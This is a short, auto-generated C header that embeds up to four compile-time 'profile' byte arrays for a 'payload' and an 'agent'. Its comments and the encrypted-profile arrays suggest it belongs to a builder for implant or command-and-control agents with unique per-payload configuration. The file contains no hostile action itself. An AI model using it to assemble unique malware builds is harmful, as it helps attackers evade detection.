/// Auto-generated config — per-payload unique profile data
/// This file is compiled with -x c and injected defines:
///   -DPROFILE_COUNT=N
///   -DPROFILE_0="..." -DPROFILE_0_SIZE=N
///   etc.
#ifndef CONFIG_H
#define CONFIG_H

#include <stdint.h>

#ifndef PROFILE_COUNT
#define PROFILE_COUNT 0
#endif

#if PROFILE_COUNT > 0

// Profile data arrays — injected via -D defines at compile time
// Each profile is a hex-escaped byte string
static const uint8_t profile_0[] = { PROFILE_0 };
static const uint32_t profile_0_size = sizeof(profile_0);

#if PROFILE_COUNT > 1
static const uint8_t profile_1[] = { PROFILE_1 };
static const uint32_t profile_1_size = sizeof(profile_1);
#endif

#if PROFILE_COUNT > 2
static const uint8_t profile_2[] = { PROFILE_2 };
static const uint32_t profile_2_size = sizeof(profile_2);
#endif

#if PROFILE_COUNT > 3
static const uint8_t profile_3[] = { PROFILE_3 };
static const uint32_t profile_3_size = sizeof(profile_3);
#endif

// Arrays for iteration
static const uint8_t* enc_profiles[] = {
    profile_0,
#if PROFILE_COUNT > 1
    profile_1,
#endif
#if PROFILE_COUNT > 2
    profile_2,
#endif
#if PROFILE_COUNT > 3
    profile_3,
#endif
};

static const uint32_t enc_profile_sizes[] = {
    profile_0_size,
#if PROFILE_COUNT > 1
    profile_1_size,
#endif
#if PROFILE_COUNT > 2
    profile_2_size,
#endif
#if PROFILE_COUNT > 3
    profile_3_size,
#endif
};

#else

// No profiles — agent exits immediately
static const uint8_t* enc_profiles[] = { 0 };
static const uint32_t enc_profile_sizes[] = { 0 };

#endif // PROFILE_COUNT > 0

#endif // CONFIG_H
